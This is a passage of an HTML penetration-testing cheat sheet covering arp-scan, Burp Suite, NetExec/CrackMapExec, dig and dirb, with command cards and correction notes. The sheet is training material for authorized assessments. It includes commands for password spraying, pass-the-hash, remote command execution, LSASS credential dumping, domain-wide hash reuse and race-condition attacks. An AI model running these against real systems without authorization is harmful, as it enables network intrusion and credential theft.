+ every device on the local Ethernet/Wi-Fi segment regardless of host-based firewall rules, since ARP can't be
+ blocked by an OS firewall the way ICMP or TCP can. This makes it the go-to first command the moment you get
+ a foothold on an internal network segment during an on-site or OT/ICS assessment.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All flags and syntax in the source sheet are accurate for the current <code>arp-scan</code> release.</li>
+<li>One addition worth making explicit: arp-scan only works on the local broadcast domain (the segment your interface is physically/virtually attached to) — it cannot discover hosts across a router hop. That's the single most common reason new testers think it 'doesn't work.'</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Scan the local network</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>sudo arp-scan --localnet</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Fires ARP 'who-has' requests for every address in the interface's connected subnet and lists everyone who answers.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>IP, MAC address, and (very useful) the vendor OUI lookup — 'Dell', 'VMware', 'Raspberry Pi Foundation' tells you device type at a glance.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Cross-reference vendor names against expected asset inventory; unexpected vendors (a random IoT device on a corporate VLAN) are worth flagging immediately.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Needs sudo/root for raw sockets — if you get zero results, check privileges before assuming the network is empty.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-l, --localnet</code></td><td>Scan the local network.</td></tr>
+<tr><td class="opt-flag"><code>-I, --interface &lt;iface&gt;</code></td><td>Specify the network interface.</td></tr>
+<tr><td class="opt-flag"><code>-q, --quiet</code></td><td>IP and MAC only, no vendor lookup.</td></tr>
+<tr><td class="opt-flag"><code>-g, --ignoredups</code></td><td>Ignore duplicate replies (common on VLAN-trunked interfaces).</td></tr>
+<tr><td class="opt-flag"><code>-r, --retry &lt;n&gt;</code></td><td>Retry attempts per host.</td></tr>
+<tr><td class="opt-flag"><code>-t, --timeout &lt;ms&gt;</code></td><td>Timeout per reply.</td></tr>
+<tr><td class="opt-flag"><code>-v, --verbose</code></td><td>Verbose output.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Full engagement kickoff on a new internal segment</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>sudo arp-scan -I eth0 --localnet | tee arp_results.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>On internal/on-site engagements this is usually the literal first command run after plugging in — before nmap, before anything IP-based — because it's near-instant and unblockable by host firewalls. The saved file becomes the seed target list for every scan that follows.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Detecting rogue devices / unauthorized VLANs hopping</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>sudo arp-scan -I eth0 --localnet -g</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Deduplicating replies matters on trunked interfaces where you might see the same MAC answer from multiple VLAN tags — a sign of VLAN hopping or a misconfigured trunk port, both worth flagging as findings on their own.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Still the standard first move on any internal/physical engagement in 2026 — nothing has replaced it for layer-2 discovery. Efficient testers pair it with <code>netdiscover</code> as a passive cross-check and immediately pipe the IP list into a fast port scanner (<code>rustscan</code>/<code>masscan</code>) rather than running a slow full nmap sweep on unknown hosts.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="burp">
+      <div class="section-header">
+        <div class="section-number">03</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🕷</span>
+          <h2>Burp Suite</h2>
+          <span class="section-cat">Web Application Testing</span>
+        </div>
+      </div>
+      <p class="section-tagline">The industry-standard intercepting proxy — and increasingly, an AI-assisted testing platform.</p>
+      <p class="section-overview">Burp remains the center of gravity for web app pentesting: virtually every finding in a web report
+ traces back to a Proxy history entry, a Repeater tab, or an Intruder attack. What's changed in the last two
+ years is the depth of automation layered on top — Burp AI (natural-language-assisted request analysis),
+ Bambda filters (inline Java-like filter/highlight scripting in the Proxy history), and a much more capable
+ built-in scanner mean less time is spent on manual grunt work than a few years ago, though manual verification
+ in Repeater is still non-negotiable before anything goes in a report.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>The five core modules (Proxy, Repeater, Intruder, Decoder, Comparer) and the four Intruder attack types (Sniper, Battering Ram, Pitchfork, Cluster Bomb) are all accurately described.</li>
+<li>DOM Invader and Collaborator descriptions are accurate. Worth adding: DOM Invader now ships built into Burp's embedded Chromium browser (no separate extension install needed since Burp 2022.x+).</li>
+<li>Missing from the original sheet: <b>Bambda filters</b> (custom inline filters/highlights in Proxy history, added 2023), the <b>Organizer</b> tab (issue triage/annotation workflow), and <b>Burp AI</b> (introduced 2025) which can suggest test steps and summarize a request/response pair — genuinely useful for junior testers but still requires manual confirmation since it can hallucinate vulnerability claims.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Proxy — the foundation of everything</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>Browser → 127.0.0.1:8080 (Burp's proxy listener) → intercept ON</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Every request/response your browser makes now passes through Burp first, letting you see, pause, and edit traffic before it reaches the server.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>The HTTP history sub-tab — look for auth tokens, hidden parameters, verbose error messages, and HTML comments.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Right-click anything interesting → Send to Repeater (manual testing) or Send to Intruder (automated fuzzing).</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No traffic showing up — check the browser is actually using 127.0.0.1:8080 as its proxy and that Burp's CA cert is installed for HTTPS interception.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Repeater — manual, iterative testing</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>Right-click request → Send to Repeater → edit → Send</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Lets you tweak one parameter at a time and immediately see the effect, which is how you confirm a hypothesis (e.g. 'is this field vulnerable to SQLi') before automating anything.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Differences in status code, response length, timing, or error text between your baseline and modified request.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Once confirmed, script the same logic as a repeatable proof-of-concept for the report.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Identical responses regardless of input usually means the parameter isn't processed server-side, or output is filtered/escaped.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Intruder — automated brute force and fuzzing</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>Send to Intruder → mark § position § → choose attack type → load payload list → Start attack</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Automates sending hundreds or thousands of request variations — brute-forcing logins, fuzzing parameters, testing an ID range for IDOR.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Sort results by response length or status code; a login page's failed attempts are usually uniform, so an outlier row is your hit.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Confirm the outlier manually in Repeater before reporting it — Intruder gives you leads, not final proof.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>All responses identical — the app may be rate-limiting, WAF-blocking, or genuinely not vulnerable at that position.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>Sniper</code></td><td>One payload set, one position at a time — good for single-parameter fuzzing.</td></tr>
+<tr><td class="opt-flag"><code>Battering Ram</code></td><td>One payload set, all positions simultaneously — same value injected everywhere at once.</td></tr>
+<tr><td class="opt-flag"><code>Pitchfork</code></td><td>Multiple payload sets iterated in lockstep — pairs username[i] with password[i].</td></tr>
+<tr><td class="opt-flag"><code>Cluster Bomb</code></td><td>Multiple payload sets, every combination — full username × password brute force.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Bambda filter to isolate JWT-bearing requests in a huge history</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>// Proxy → HTTP history → Filter → Bambda editor
+return requestResponse.request().headerValue("Authorization") != null
+  &amp;&amp; requestResponse.request().headerValue("Authorization").contains("Bearer");</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>On a large SPA with thousands of history entries, Bambda filters (Burp's inline scripting filter, added in 2023.x) let you write a one-line condition instead of scrolling manually. This specific filter is one of the most-used patterns for API/JWT-heavy modern web apps.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Turbo Intruder for high-volume race-condition testing</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code># BApp Store → install Turbo Intruder
+# Extender tab → Turbo Intruder → paste Python attack script → Attack
+engine = RequestEngine(endpoint=target, concurrentConnections=30, engine=Engine.BURP2)
+for i in range(20):
+    engine.queue(target.req, gate='race1')
+engine.openGate('race1')</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Standard Intruder is throttled by design and can't reliably fire dozens of requests within the same millisecond — which is exactly what's needed to exploit race conditions (double-spend coupon codes, TOCTOU issues in balance transfers). Turbo Intruder's request-gating pattern shown here is the current standard technique used to demonstrate race-condition findings in modern bug bounty reports.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Param Miner for hidden/cache-poisoning parameters</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code># BApp Store → install Param Miner
+# Right-click request → Guess params → Guess headers / Guess GET/POST parameters</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Param Miner brute-forces hidden parameter and header names against a request and is the tool most testers reach for when hunting web-cache-poisoning bugs — still one of the highest-paying bug classes on bounty platforms.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Burp Pro (or the free Community edition for manual-only work) is still non-negotiable for web pentesting in 2026. Efficient testers lean heavily on the BApp Store — Param Miner, Turbo Intruder, Autorize (access-control testing), and Logger++ round out a modern setup — and treat Burp's built-in AI-assisted scanning as a triage aid, never as a replacement for manually walking Repeater through every finding before it goes in a report.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="cme">
+      <div class="section-header">
+        <div class="section-number">04</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🗝</span>
+          <h2>CrackMapExec / NetExec</h2>
+          <span class="section-cat">Active Directory</span>
+        </div>
+      </div>
+      <p class="section-tagline">AD swiss-army knife for spraying, enumerating, and executing across an entire domain at once.</p>
+      <p class="section-overview">This is the single most important correction across the whole batch: <b>CrackMapExec (CME) was
+ archived by its maintainer in 2023</b> and is no longer developed. The actively maintained continuation is
+ <b>NetExec (nxc)</b>, built by much of the same community, using an almost identical command syntax — most
+ <code>cme ...</code> commands work by swapping in <code>nxc ...</code> unchanged. Anyone learning this tool
+ today should install and practice with NetExec, not the archived CME package, even though the muscle memory
+ and module names carry straight over.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li><b>Correction:</b> CrackMapExec's GitHub repository was archived (read-only) in 2023. Kali and other current distros now ship <code>netexec</code> as the package name; the binary is invoked as <code>nxc</code>.</li>
+<li>All command syntax below is shown in both forms — historic <code>cme</code> and current <code>nxc</code> — since the flags are functionally identical.</li>
+<li>The listed modules (<code>gpp_password</code>, <code>mimikatz</code>, <code>spider_plus</code>, <code>bloodhound</code>, <code>lsassy</code>, <code>reg</code>) all exist in NetExec too, though a few module names have shifted slightly between versions — always run <code>nxc smb -L</code> to list modules actually available in your installed version.</li>
+<li><code>--gen-relay-list</code> is a real flag, but it generates a list of SMB-signing-disabled hosts for use with <code>ntlmrelayx.py</code> — it does not save credentials to the internal database as the original sheet implied. Credentials are stored automatically in the CME/NetExec workspace database on every successful login, with no flag needed.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Password spraying across a subnet</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>nxc smb 10.10.10.0/24 -u users.txt -p 'Summer2026!'</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Tests one password against many usernames across every live host — the standard way to find one weak account in a large environment without triggering per-account lockout (since each account only gets one attempt).</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A <code>(Pwned!)</code> tag next to a host/username combo indicates a valid login.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Immediately re-run enumeration modules (<code>--shares</code>, <code>-M bloodhound</code>) using that new credential.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No hits — try the inverse (one known username, many common passwords) or check the domain's password/lockout policy first with <code>nxc smb $IP -u '' -p '' --pass-pol</code>.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Share enumeration</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>nxc smb $IP -u zak -p zak123 --shares</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Finds every file share the current credential can see and what access level it has.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Shares flagged <code>READ</code> or <code>WRITE</code> beyond the defaults (<code>C$</code>, <code>ADMIN$</code>, <code>IPC$</code>, <code>SYSVOL</code>, <code>NETLOGON</code>).</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Point <code>-M spider_plus</code> at readable shares to search their contents automatically instead of browsing manually.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Access denied everywhere — the account may have no meaningful share permissions, which is itself worth noting.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Command execution</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>nxc smb $IP -u zak -p zak123 -x "whoami /all"</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Runs a command remotely once you have valid credentials, without needing a full interactive shell — fast way to confirm privilege level across many hosts at once.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Command output returned directly in the terminal.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>If the account has local admin, escalate to a full shell (psexec.py, evil-winrm) or dump credentials with -M lsassy.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Access denied — account isn't a local admin on that host, which restricts you to lower-privilege actions like RID cycling or share enumeration.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Pass-the-Hash</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>nxc smb $IP -u zak -H &lt;ntlm_hash&gt; --shares</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Authenticates using a captured NTLM hash instead of a plaintext password — essential once you've dumped hashes via secretsdump or Mimikatz.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Same (Pwned!) success indicator as password auth.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Hash reuse across hosts (local admin password reuse) is one of the highest-value findings in an AD assessment — spray the hash across the whole subnet, not just one host.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Hash rejected — double check it's the NT hash, not the LM hash half, and that you haven't accidentally included the LM portion.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-M gpp_password</code></td><td>Finds credentials left in Group Policy Preferences XML files.</td></tr>
+<tr><td class="opt-flag"><code>-M mimikatz</code></td><td>Dumps in-memory credentials via Mimikatz.</td></tr>
+<tr><td class="opt-flag"><code>-M spider_plus</code></td><td>Recursively searches accessible shares for sensitive filenames/content.</td></tr>
+<tr><td class="opt-flag"><code>-M bloodhound</code></td><td>Collects AD relationship data for BloodHound analysis.</td></tr>
+<tr><td class="opt-flag"><code>-M lsassy</code></td><td>Dumps LSASS memory remotely without dropping a binary to disk.</td></tr>
+<tr><td class="opt-flag"><code>-M reg</code></td><td>Reads/writes registry keys and values remotely.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Full loot sweep in one line (typical AD-assessment day-one workflow)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>nxc smb $IP -u zak -p zak123 --shares &amp;&amp; nxc smb $IP -u zak -p zak123 -M spider_plus -M gpp_password &amp;&amp; nxc ldap $IP -u zak -p zak123 --bloodhound --collection All</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Chaining these three calls is close to the actual muscle-memory workflow of an experienced AD tester on day one of an internal assessment: confirm access, sweep shares for low-hanging leaked secrets, then immediately pull full BloodHound collection data so path-finding can start in parallel while manual enumeration continues.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Local-admin password reuse check across the whole domain</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>nxc smb domain_hosts.txt -u administrator -H &lt;ntlm_hash&gt; --shares 2&gt;&amp;1 | grep Pwned</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Once you've cracked or dumped one local admin hash, spraying it across every known host in the domain is the fastest way to reveal 'gold image' password reuse — one of the most common and most damaging AD misconfigurations, and usually a headline finding in the final report.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>NetExec (<code>nxc</code>) is what's actually installed on Kali by default now and what's used in real engagements — treat CrackMapExec as legacy naming you'll still see referenced in older writeups and OSCP/CPTS material, but install and drill on NetExec. The workflow logic (spray → enumerate shares → dump credentials → pivot) hasn't changed, only the binary name and a handful of module tweaks.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="dig">
+      <div class="section-header">
+        <div class="section-number">05</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🔎</span>
+          <h2>dig</h2>
+          <span class="section-cat">DNS Reconnaissance</span>
+        </div>
+      </div>
+      <p class="section-tagline">The precision instrument for DNS — every subdomain enumeration tool eventually calls something like this under the hood.</p>
+      <p class="section-overview">dig is the tool you reach for once amass/subfinder has given you a list, when you need to answer
+ a specific, surgical question: what MX records does this domain have right now, does this subdomain still
+ resolve, is this DNS server willing to hand over a full zone. It's also the fastest way to sanity-check
+ findings from automated tools before writing them into a report.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All record types, flags, and syntax shown are accurate and current.</li>
+<li>Worth noting: <code>ANY</code> queries are increasingly refused or rate-limited by modern authoritative servers (RFC 8482 recommends this) as an anti-amplification-DDoS measure, so a real assessment today usually queries record types individually (A, AAAA, MX, TXT, NS) rather than relying on ANY returning everything.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Basic lookup</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>dig example.com</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Quick sanity check of a domain's A record and general DNS health, including the full response with query/answer/authority sections.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>The ANSWER SECTION for the resolved IP; the query time and SERVER line confirm which resolver actually answered.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Cross-reference the IP against known cloud provider ranges (AWS, Azure, Cloudflare) to understand hosting.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>NXDOMAIN means the domain doesn't exist or isn't delegated yet.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Specific record types</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>dig example.com MX
+dig example.com TXT
+dig example.com NS</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Each record type answers a different recon question: MX reveals the mail provider (Google Workspace vs O365 vs self-hosted — relevant for phishing infra choices), TXT often leaks SPF/DKIM policy and sometimes verification tokens for other services (which reveal what SaaS tools the org uses), NS shows who hosts their DNS.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>TXT records mentioning specific SaaS platforms (google-site-verification, docusign, atlassian-domain-verification) are a quiet way to fingerprint the org's tool stack.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Feed discovered SaaS platform names into your OSINT notes — they're useful later for pretexting and for guessing what auth provider (SSO) the target uses.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Empty answer for a record type just means that type isn't configured, not an error.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>+short</code></td><td>Just the answer, no headers/footers.</td></tr>
+<tr><td class="opt-flag"><code>+noall +answer</code></td><td>Only the answer section.</td></tr>
+<tr><td class="opt-flag"><code>+trace</code></td><td>Full delegation path from root servers down.</td></tr>
+<tr><td class="opt-flag"><code>-x &lt;ip&gt;</code></td><td>Reverse lookup (PTR record).</td></tr>
+<tr><td class="opt-flag"><code>@&lt;server&gt;</code></td><td>Query a specific DNS server directly.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Zone transfer test (the single most valuable dig command in recon)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>dig axfr @ns1.example.com example.com</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Tests whether the authoritative nameserver will hand over the entire zone file to anyone who asks — a severe misconfiguration that, when it works, instantly reveals every internal and external hostname the org has ever configured. Still found occasionally on real engagements, especially against older or self-managed BIND servers, and is an easy high-severity finding when it hits.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Bulk resolution from a subdomain list</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>for sub in $(cat subs.txt); do dig +short "$sub" A; done</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>A quick one-liner to batch-resolve a subdomain list from amass/subfinder without needing a heavier tool like dnsx installed — useful when you're working from a minimal toolbox on a locked-down jump host.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>dig stays relevant forever because it's the raw primitive everything else is built on. In current workflows it's used less for bulk enumeration (that's massdns/dnsx/puredns territory now, which are far faster at scale) and more for targeted verification — confirming a single finding, testing one nameserver for a zone transfer, or debugging why an automated tool returned something unexpected.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="dirb">
+      <div class="section-header">
+        <div class="section-number">06</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">📁</span>
+          <h2>dirb</h2>
+          <span class="section-cat">Web Content Discovery</span>
+        </div>
+      </div>
+      <p class="section-tagline">One of the original directory brute-forcers — mostly of historical and educational value today.</p>
+      <p class="section-overview">dirb pioneered dictionary-based web content discovery, but it's single-threaded and noticeably
+ slower than its modern replacements. It still ships on Kali and still works fine for a quick one-off scan,
+ but almost no working pentester makes it their primary tool anymore.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All flags and syntax are correct and current.</li>
+<li><b>Important market-reality flag:</b> dirb has effectively been superseded by <code>gobuster</code>, <code>ffuf</code>, and <code>feroxbuster</code>, all of which are multi-threaded (dirb is single-threaded by design) and an order of magnitude faster on the same wordlist. Most current course material (including HTB's own CPTS track) still teaches dirb first because its defaults are forgiving and its output is easy to read, but production engagements almost always use one of the faster three tools instead.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Basic scan</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>dirb http://$IP</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Runs dirb's own default wordlist (common.txt) against the target, checking each guessed path for a non-404 response.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Paths like /admin, /backup, /config.php returning 200, 301, or 403 (403 still confirms the path exists, just access is blocked).</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Manually browse anything interesting; 403 results are worth a second look with a different HTTP method or a trailing slash, since some misconfigurations only block GET.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>dirb's bundled wordlist is small — a clean scan doesn't mean the server has no hidden content, only that this specific wordlist found nothing.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-o &lt;file&gt;</code></td><td>Save output.</td></tr>
+<tr><td class="opt-flag"><code>-w &lt;wordlist&gt;</code></td><td>Use a custom wordlist.</td></tr>
+<tr><td class="opt-flag"><code>-X &lt;ext&gt;</code></td><td>Append extensions to wordlist entries.</td></tr>
